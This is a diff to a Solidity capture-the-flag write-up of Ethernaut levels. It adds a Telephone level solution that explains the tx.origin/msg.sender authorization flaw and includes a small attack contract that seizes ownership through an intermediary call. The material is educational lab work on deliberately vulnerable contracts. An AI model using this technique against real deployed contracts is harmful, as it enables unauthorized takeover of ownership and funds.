@@ -170,7 +170,7 @@ Other links for further reading
 To beat this level, we need to comply with
 
 ```solidity
-return instance.owner() == _player;
+instance.owner() == _player;
 ```
 
 ### Solution
@@ -208,7 +208,7 @@ challenge.Fal1out();
 To beat this level, we need to comply with
 
 ```solidity
-return instance.consecutiveWins() >= 10;
+instance.consecutiveWins() >= 10;
 ```
 
 That is, we need to win the game 10 or more times.
@@ -260,6 +260,69 @@ function attack(Vm vm) public {
 * https://book.getfoundry.sh/cheatcodes/
 
 ## 04 Telephone
+
+To beat this level, we need to comply with
+
+```solidity
+instance.owner() == _player;
+```
+
+### Solution
+
+From the [solidity documentation](https://docs.soliditylang.org/en/v0.8.19/units-and-global-variables.html#block-and-transaction-properties)
+
+* `msg.sender` (address): sender of the message (current call)
+* `tx.origin` (address): sender of the transaction (full call chain)
+
+
+We write this attack contract that does the actual call to the level
+
+```solidity
+contract TelephoneAttack {
+  ITelephone internal challenge;
+
+  constructor(address _challengeAddress) {
+    challenge = ITelephone(_challengeAddress);
+  }
+
+  function attack() public {
+    challenge.changeOwner(msg.sender);
+  }
+}
+```
+
+As the function `changeOwner()` in the level is
+
+```solidity
+function changeOwner(address _owner) public {
+  if (tx.origin != msg.sender) {
+    owner = _owner;
+  }
+}
+```
+
+This means that the contract (or EOA) that calls `attack()` will get the ownership of the contract `_owner` parameter, provided we comply with `tx.origin != msg.sender`. This condition is true as this is the call chain:
+
+```
+tx.origin  ->                                msg.sender below         ->                                  ;
+
+(Test EOA) -> TelephoneTest.testExploit() -> TelephoneAttack.attack() -> challenge.changeOwner(msg.sender);
+```
+
+In this case `tx.origin` would be the EOA, `msg.sender` _inside_ the `changeOwner()` function is the address of the `TelephoneAttack` contract, and the `_owner` is the `TelephoneTest` contract.
+
+The check at the factory will work as it is perform by the test contract.
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.19/units-and-global-variables.html#block-and-transaction-properties
+* https://docs.soliditylang.org/en/v0.8.19/security-considerations.html#tx-origin
+* https://ethereum.stackexchange.com/a/1892
+* https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing
+
+
+-----------------------------------------------------
+## 05 Token
 
 To beat this level, we need to comply with
 
